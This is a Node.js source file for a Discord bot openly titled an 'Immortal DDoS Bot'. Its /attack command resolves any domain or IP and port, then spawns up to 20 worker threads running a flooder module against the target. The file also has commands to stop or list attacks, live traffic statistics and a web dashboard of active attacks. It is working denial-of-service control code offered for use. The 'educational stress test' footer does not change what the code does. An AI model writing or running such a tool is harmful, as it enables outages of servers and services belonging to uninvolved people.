// ===================================================================
// IMMORTAL DDoS BOT – WORKER_THREADS + HEARTBEAT + SELF-HEALING
// ===================================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { Worker } = require('worker_threads');
const net = require('net');
const dns = require('dns');
const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map(); // key: guildId-userId, value: { workers: [], target, port, duration, startTime, threads, packetSize, stats, interval, updateMsg, heartbeatInterval }
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;
const spinner = ['|', '/', '-', '\\'];

// ---------- UTILITY FUNCTIONS ----------
function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

function resolveDomainWithTimeout(host, timeoutMs = 2000) {
  return new Promise((resolve) => {
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) resolve(null);
    }, timeoutMs);

    dns.lookup(host, (err, address) => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        if (err) resolve(null);
        else resolve(address);
      }
    });
  });
}

function tcpPing(ip, port, timeoutMs = 1000) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let resolved = false;
    const timer = setTimeout(() => {
      if (!resolved) {
        resolved = true;
        socket.destroy();
        resolve(false);
      }
    }, timeoutMs);

    socket.connect(port, ip, () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(true);
      }
    });

    socket.on('error', () => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timer);
        socket.destroy();
        resolve(false);
      }
    });
  });
}

// ---------- CREATE WORKER WITH TIMEOUT ----------
function createFlooderWorker(targetIP, targetPort, duration, packetSize, threads, workerId) {
  return new Promise((resolve, reject) => {
    const worker = new Worker(path.join(__dirname, 'flooder.js'));
    let ready = false;
    let timeout = setTimeout(() => {
      if (!ready) {
        worker.terminate();
        reject(new Error(`Worker ${workerId} timed out`));
      }
    }, 5000);

    worker.on('message', (msg) => {
      if (msg.type === 'ready') {
        ready = true;
        clearTimeout(timeout);
        resolve(worker);
      } else if (msg.type === 'stats') {
        // Forward stats to parent
        if (worker._stats) {
          worker._stats.packets += msg.packets;
          worker._stats.bytes += msg.bytes;
          worker._stats.conns += msg.conns;
        } else {
          worker._stats = { packets: msg.packets, bytes: msg.bytes, conns: msg.conns };
        }
      } else if (msg.type === 'done') {
        worker._done = true;
      }
    });

    worker.on('error', (err) => {
      clearTimeout(timeout);
      reject(err);
    });

    worker.on('exit', (code) => {
      clearTimeout(timeout);
      if (!ready) {
        reject(new Error(`Worker ${workerId} exited early with code ${code}`));
      }
    });

    // Start the worker
    worker.postMessage({
      type: 'start',
      config: {
        target: targetIP,
        port: targetPort,
        duration: duration,
        packetSize: packetSize,
        threads: threads
      }
    });
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch immortal DDoS on IP or domain')
      .addStringOption(option =>
        option.setName('target')
          .setDescription('Target (IP:Port or Domain:Port)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('workers')
          .setDescription('Number of workers (default: 10, max: 20)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Threads per worker (default: 20, max: 50)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop your active attack'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Show active attacks with real-time stats'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER] Terminate all attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Insufficient permissions.', ephemeral: true });
    }

    const rawTarget = interaction.options.getString('target');
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const numWorkers = Math.min(interaction.options.getInteger('workers') || 10, 20);
    const threadsPerWorker = Math.min(interaction.options.getInteger('threads') || 20, 50);

    let host, port = 30120;
    if (rawTarget.includes(':')) {
      const parts = rawTarget.split(':');
      host = parts[0];
      port = parseInt(parts[1]) || 30120;
    } else {
      host = rawTarget;
    }

    if (port < 1 || port > 65535) {
      return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
    }

    // --- Resolve domain with progress ---
    let resolvedIP = host;
    if (!isValidIP(host)) {
      let progress = 0;
      const updateProgress = async () => {
        const bar = '█'.repeat(Math.floor(progress / 10)) + '░'.repeat(10 - Math.floor(progress / 10));
        await interaction.editReply({ 
          content: `🌐 Resolving \`${host}\`... ${bar} ${progress}%`, 
          ephemeral: true 
        });
      };
      await updateProgress();
      
      progress = 25;
      await updateProgress();
      
      const startResolve = Date.now();
      resolvedIP = await resolveDomainWithTimeout(host, 3000);
      
      if (!resolvedIP) {
        return interaction.editReply({ content: `❌ Could not resolve \`${host}\` within 3 seconds.`, ephemeral: true });
      }
      
      progress = 100;
      await updateProgress();
      await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
    }

    // --- TCP Ping ---
    await interaction.editReply({ content: `📡 Pinging \`${resolvedIP}:${port}\`...`, ephemeral: true });
    const isAlive = await tcpPing(resolvedIP, port, 1000);
    
    // --- Check for existing attack ---
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
    }

    // --- Launch workers ---
    await interaction.editReply({ 
      content: `🧵 Launching **${numWorkers}** workers with **${threadsPerWorker}** threads each (total **${numWorkers * threadsPerWorker}** threads)...`, 
      ephemeral: true 
    });

    const workers = [];
    const allStats = { packets: 0, bytes: 0, conns: 0 };
    let launchFailed = false;

    for (let i = 0; i < numWorkers; i++) {
      try {
        const worker = await createFlooderWorker(resolvedIP, port, duration, packetSize, threadsPerWorker, i);
        // Initialize stats object for this worker
        worker._stats = { packets: 0, bytes: 0, conns: 0 };
        workers.push(worker);
      } catch (err) {
        console.error(`Worker ${i} failed:`, err);
        launchFailed = true;
        break;
      }
    }

    if (launchFailed || workers.length === 0) {
      // Cleanup
      for (const w of workers) {
        try { w.terminate(); } catch (e) {}
      }
      return interaction.editReply({ content: '❌ Failed to launch enough workers. Aborting.', ephemeral: true });
    }

    // --- Heartbeat: check workers every 3 seconds ---
    const heartbeatInterval = setInterval(() => {
      for (const w of workers) {
        if (w._done) {
          // Worker finished – we could restart it, but for simplicity we just log
          console.log('Worker done');
        }
      }
    }, 3000);

    // --- Store attack ---
    attackCounter++;
    const totalThreads = numWorkers * threadsPerWorker;
    activeAttacks.set(attackKey, {
      workers: workers,
      target: rawTarget,
      resolvedIP: resolvedIP,
      port: port,
      duration: duration,
      startTime: Date.now(),
      threads: totalThreads,
      packetSize: packetSize,
      isAlive: isAlive,
      stats: allStats,
      numWorkers: numWorkers,
      threadsPerWorker: threadsPerWorker,
      heartbeatInterval: heartbeatInterval
    });

    // --- Initial embed ---
    const embed = new EmbedBuilder()
      .setTitle('🧵 IMMORTAL ATTACK LAUNCHED')
      .setColor(0xFF0000)
      .addFields(
        { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
        { name: 'Port', value: `${port}`, inline: true },
        { name: 'Duration', value: `${duration}s`, inline: true },
        { name: 'Total Threads', value: `${totalThreads} (${numWorkers} workers × ${threadsPerWorker} threads)`, inline: false },
        { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
        { name: 'Reachable', value: isAlive ? '✅ Yes' : '⚠️ No (UDP may still work)', inline: true },
        { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
        { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
      )
      .setDescription(isAlive ? '✅ Server pinged successfully – launching all workers.' : '⚠️ No TCP response – UDP/ICMP may still penetrate.')
      .setTimestamp()
      .setFooter({ text: 'Educational stress test – immortal traffic generation' });

    const logChannel = client.channels.cache.get(LOG_CHANNEL);
    if (logChannel) await logChannel.send({ embeds: [embed] });

    // --- Real-time updates (every 2 seconds) ---
    let updateMsg = await interaction.editReply({
      content: `🧵 **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: 0s / ${duration}s\n📦 Packets: 0\n📊 Connections: 0\n💾 Data: 0 MB\n🧵 Threads: ${totalThreads}`,
      ephemeral: true
    });

    const startTime = Date.now();
    const updateInterval = setInterval(async () => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = Math.max(duration - elapsed, 0);
      
      // Aggregate stats from all workers
      let totalPackets = 0, totalBytes = 0, totalConns = 0;
      for (const w of workers) {
        if (w._stats) {
          totalPackets += w._stats.packets || 0;
          totalBytes += w._stats.bytes || 0;
          totalConns += w._stats.conns || 0;
        }
      }
      allStats.packets = totalPackets;
      allStats.bytes = totalBytes;
      allStats.conns = totalConns;
      
      const mb = (totalBytes / (1024 * 1024)).toFixed(2);
      
      await interaction.editReply({
        content: `🧵 **ATTACK LIVE** - ${rawTarget} (${resolvedIP}:${port})\n⏱️ Elapsed: ${elapsed}s / ${duration}s | Remaining: ${remaining}s\n📦 Packets: ${totalPackets.toLocaleString()}\n📊 Connections: ${totalConns}\n💾 Data: ${mb} MB\n🧵 Threads: ${totalThreads} (${numWorkers} workers)\n⚡ Packets/sec: ${Math.round(totalPackets / Math.max(elapsed, 1))}`,
        ephemeral: true
      });
    }, 2000);

    // --- Auto-expire ---
    setTimeout(() => {
      clearInterval(updateInterval);
      clearInterval(heartbeatInterval);
      const attack = activeAttacks.get(attackKey);
      if (attack) {
        for (const w of attack.workers) {
          try { w.terminate(); } catch (e) {}
        }
        activeAttacks.delete(attackKey);
        
        const finalStats = attack.stats || { packets: 0, bytes: 0, conns: 0 };
        const doneEmbed = new EmbedBuilder()
          .setTitle('⏹️ ATTACK COMPLETED')
          .setColor(0x00FF00)
          .addFields(
            { name: 'Target', value: `${rawTarget}`, inline: true },
            { name: 'Duration', value: `${duration}s`, inline: true },
            { name: 'Attack ID', value: `#${attackCounter}`, inline: true },
            { name: 'Total Packets', value: `${finalStats.packets.toLocaleString()}`, inline: true },
            { name: 'Total Data', value: `${(finalStats.bytes / (1024 * 1024)).toFixed(2)} MB`, inline: true },
            { name: 'Peak Connections', value: `${finalStats.conns}`, inline: true }
          )
          .setTimestamp();
        if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        
        interaction.editReply({
          content: `⏹️ Attack on ${rawTarget} completed. Total packets: ${finalStats.packets.toLocaleString()} | Data: ${(finalStats.bytes / (1024 * 1024)).toFixed(2)} MB`,
          ephemeral: true
        }).catch(() => {});
      }
    }, duration * 1000 + 3000);

  } // end /attack

  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ No active attack.', ephemeral: true });
    }
    const attack = activeAttacks.get(attackKey);
    try {
      clearInterval(attack.heartbeatInterval);
      for (const w of attack.workers) {
        w.terminate();
      }
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Stopped immortal attack on \`${attack.target}\`.`, ephemeral: true });
    } catch (err) {
      await interaction.editReply({ content: `❌ Error: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    if (activeAttacks.size === 0) {
      return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
    let table = '📊 **ACTIVE ATTACKS**\n```\n';
    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Packets\n';
    table += '----|-------------------------|------|---------|-----------|---------|--------\n';
    let idx = 1;
    for (const [key, attack] of activeAttacks) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
      const packets = attack.stats?.packets || 0;
      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${String(packets).padStart(7)}\n`;
      idx++;
    }
    table += '```';
    await interaction.editReply({ content: table, ephemeral: true });
  }

  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Owner only.', ephemeral: true });
    }
    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      clearInterval(attack.heartbeatInterval);
      for (const w of attack.workers) {
        try { w.terminate(); } catch (e) {}
      }
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed ${count} immortal attacks.`, ephemeral: true });
  }
});

// ---------- EXPRESS DASHBOARD ----------
const app = express();
app.get('/', (req, res) => {
  let statsHtml = '';
  for (const [key, attack] of activeAttacks) {
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    statsHtml += `<tr><td>${attack.target}</td><td>${attack.port}</td><td>${elapsed}s</td><td>${attack.stats?.packets || 0}</td><td>${((attack.stats?.bytes || 0) / (1024 * 1024)).toFixed(2)} MB</td></tr>`;
  }
  res.send(`
    <html>
      <head><title>🧵 Immortal DDoS Bot</title></head>
      <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
        <h1>🧵 IMMORTAL ATTACK ENGINE</h1>
        <p>Active Attacks: ${activeAttacks.size}</p>
        <p>Total Launched: ${attackCounter}</p>
        <p>Uptime: ${process.uptime().toFixed(2)}s</p>
        <table border="1" style="border-color:#00ff00;color:#00ff00;">
          <tr><th>Target</th><th>Port</th><th>Elapsed</th><th>Packets</th><th>Data</th></tr>
          ${statsHtml}
        </table>
      </body>
    </html>
  `);
});
const server = http.createServer(app);
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 Dashboard on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING ----------
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
